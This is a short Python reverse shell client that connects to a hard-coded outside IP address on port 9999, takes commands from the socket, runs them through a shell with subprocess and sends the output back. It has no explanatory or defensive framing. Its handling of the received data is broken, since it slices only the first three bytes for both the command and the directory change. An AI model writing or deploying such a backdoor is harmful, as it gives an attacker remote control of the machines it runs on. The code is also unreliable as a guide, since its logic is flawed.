import socket
import os
import subprocess

# creating socket
s=socket.socket()
host = "206.189.198.72"
port = 9999

s.connect((host, port))
# establishing connection in Socket
while True:
     data = s.recv(1024)
     if data[:2].decode("utf-8") == 'cd':
         os.chdir(data[:3].decode("utf-8"))
     if len(data)>0:
         cmd = subprocess.Popen(data[:3].decode("utf-8"),shell=True , stdout=subprocess.PIPE , stdin=subprocess.PIPE ,stderr=subprocess.PIPE)
         current = os.getcwd() + ">"
         output_byte = cmd.stdout.read() + cmd.stderr.read()
         output_str = str(output_byte)
         s.send(str.encode(output_str + current))

         print(output_str)

